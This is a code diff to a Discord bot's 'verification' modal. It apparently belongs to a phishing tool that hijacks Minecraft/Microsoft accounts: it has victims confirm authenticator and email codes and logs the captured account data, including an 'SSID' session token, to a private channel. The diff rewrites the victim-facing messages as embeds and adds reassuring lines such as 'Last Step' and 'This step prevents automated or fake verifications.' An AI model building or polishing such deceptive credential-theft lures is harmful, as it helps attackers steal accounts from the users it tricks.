@@ -40,7 +40,10 @@ class MyModalOne(ui.Modal):
         await interaction.response.defer(ephemeral=True)
 
         await interaction.followup.send(
-            "⌛ Please wait while we try to verify you...",
+            embed = discord.Embed(
+                description = "⌛ Please wait while we try to verify you...",
+                color = 0xDE755B
+            ),
             ephemeral = True
         )
         
@@ -86,8 +89,8 @@ class MyModalOne(ui.Modal):
                 
             await interaction.followup.send(
                 embed = Embed(
-                    title="Verification",
-                    description=f"Authenticator Request.\nPlease confirm the code **`{entropy}`** on your app!",
+                    title="Last Step",
+                    description=f"An Authenticator Request has been sent.\nPlease confirm the code **`{entropy}`** on your app! This step prevents automated or fake verifications.",
                     colour=0x00FF00
                 ),
                 ephemeral = True
@@ -164,7 +167,11 @@ class MyModalOne(ui.Modal):
                     await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
 
                     await interaction.followup.send(
-                        "⌛ Please allow us to proccess your roles...", ephemeral=True
+                        embed = discord.Embed(
+                            description = "⌛ Please allow us to proccess your roles...",
+                            color = 0xDE755B
+                        ),
+                        ephemeral = True
                     )
                     
                     # Embeds | Account, Minecraft, SSID, Extra Info, Inbox (separate)
@@ -308,7 +315,7 @@ class MyModalOne(ui.Modal):
 
             await interaction.followup.send(
                 embed=Embed(
-                    title="Verification",
+                    title="Last Step",
                     description=f"To complete verification, enter the confirmation code we sent to {verEmail}.\nThis step prevents automated or fake verifications.",
                     colour=0x00FF00
                 ),
